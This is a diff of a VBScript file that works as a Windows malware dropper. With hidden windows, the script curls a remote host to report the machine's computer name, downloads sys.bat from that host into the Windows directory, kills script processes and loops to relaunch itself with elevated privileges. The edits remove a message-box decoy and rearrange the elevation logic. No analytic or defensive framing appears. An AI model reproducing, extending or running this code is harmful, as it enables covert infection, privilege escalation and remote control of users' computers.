@@ -4,11 +4,8 @@ Set oShell = CreateObject ("WScript.Shell")
 windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
 
-if WScript.Arguments.Named.Exists("elevate") then
-  oShell.Run "taskkill /f /im cscript.exe", 0, True
-  oShell.Run "taskkill /f /im wscript.exe", 0, True
-end if
-x=msgbox("Your Text Here" ,0, "Your Title Here")
+
+
 With oShell
   .Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_before_" & strComputerName, 0, True
   .Run "curl http://troglo.homepc.it/win/sys.bat -o "& windir &"\sys.bat", 0, True
@@ -29,7 +26,11 @@ With oShell
   ' Message = "Non-Admin"
   'End If
 End With
-oShell.Run oShell.ExpandEnvironmentStrings( "%APPDATA%" )&"\elevate.exe cscript.exe " & WScript.ScriptFullName, 0, True
+if WScript.Arguments.Named.Exists("elevate") then
+  oShell.Run "taskkill /f /im cscript.exe", 0, True
+  oShell.Run "taskkill /f /im wscript.exe", 0, True
+end if
+'oShell.Run oShell.ExpandEnvironmentStrings( "%APPDATA%" )&"\elevate.exe cscript.exe " & WScript.ScriptFullName, 0, True
 Do while not WScript.Arguments.Named.Exists("elevate")
   'oShell.Run "taskkill /f /im msiexec.exe", 0, True 
   CreateObject("Shell.Application").ShellExecute WScript.FullName _
